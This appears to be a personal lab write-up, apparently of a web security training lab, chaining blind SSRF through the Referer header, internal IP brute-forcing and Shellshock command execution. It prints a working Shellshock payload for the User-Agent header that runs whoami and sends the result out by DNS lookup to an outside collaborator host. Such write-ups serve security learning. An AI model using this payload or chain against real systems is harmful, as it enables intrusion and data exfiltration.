## ðŸŽ¯ Objective

Exploit a **blind Server-Side Request Forgery (SSRF)** vulnerability to discover an **internal backend system**, then achieve **remote command execution (RCE)** by abusing a **Shellshock-vulnerable service**, confirmed via **out-of-band (OAST) interactions**.

---

## ðŸ§© 1. Initial Testing & Vulnerability Identification

### Feature Tested

- Product page (**HTTP GET** request)

Multiple HTTP headers were reviewed to identify backend-processed input.

### Parameter Identified

- **`Referer` header**

---

## ðŸ”Ž 2. Detecting Blind SSRF via Out-of-Band Interaction

### Test Performed

The `Referer` header was replaced with a **Burp Collaborator** URL.

### Observation

- **DNS lookup and HTTP request** observed in Burp Collaborator
- **No visible change** in the web application response

### Conclusion

- The backend server makes outbound requests using the `Referer`
- The vulnerability is **blind SSRF**, detectable only via **OAST techniques**

---

## ðŸ§  3. Why This Is Blind SSRF

- No reflected output
- No error messages
- No behavioral change in the response

The only confirmation channel is **external interaction**, making this a classic **blind SSRF** case.

---

## ðŸ§ª 4. Internal IP Discovery via Blind SSRF

### Technique Used

The `Referer` header was modified to point to an internal address:

```
http://192.168.0.X:8080
```

### Automation

- **Burp Intruder** was used to brute-force the internal range
- Payload position: `192.168.0.X`
- Range tested: `1 â†’ 255`

### Result

- OAST interactions were observed for a specific internal IP
- This confirmed a **reachable internal backend service**

---

## ðŸ”¬ 5. Identifying the Shellshock Injection Point

Analysis of the Collaborator interaction revealed:

- The **`User-Agent` header** was included in outbound requests
- This indicates backend processing by a shell-based component

This made `User-Agent` a viable vector for **Shellshock exploitation**.

---

## ðŸ’¥ 6. Shellshock Payload Injection

### Payload Used

```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

```

### Injection Point

- **`User-Agent` HTTP header**

---

## ðŸ§¨ 7. Command Execution Confirmation

### Observation in Burp Collaborator

A DNS lookup was received containing the output of the `whoami` command:

```
peter-a8Cwe4
```

### What This Proves

- Arbitrary OS commands are executed on the backend
- The backend system is **vulnerable to Shellshock**
- The command runs under the user context **`peter-a8Cwe4`**

This confirms **true remote command execution**, not just SSRF interaction.

---

## ðŸ“Š 8. Final Result

```
Vulnerability chain:
BlindSSRF
â†’InternalIPbrute-force
â†’Headerinjection
â†’Shellshock
â†’Remotecommandexecution

Execution context:
peter-a8Cwe4

```

The lab was marked as **solved** after successful command execution.

---

## ðŸ”® 9. Key Takeaways (Attacker Mindset)

- Blind SSRF often requires **enumeration before exploitation**
- Internal services may exist even when no response is visible
- Headers forwarded by backend services are high-value targets
- SSRF can act as a **discovery and delivery vector** for RCE
- OAST tooling is essential when applications provide zero feedback

---

## ðŸ§­ 10. Notes for My Future Self

- Always brute-force internal IP ranges in blind SSRF
- Monitor which headers are forwarded downstream
- Shellshock is still exploitable in legacy environments
- DNS-based payloads are reliable for blind RCE verification
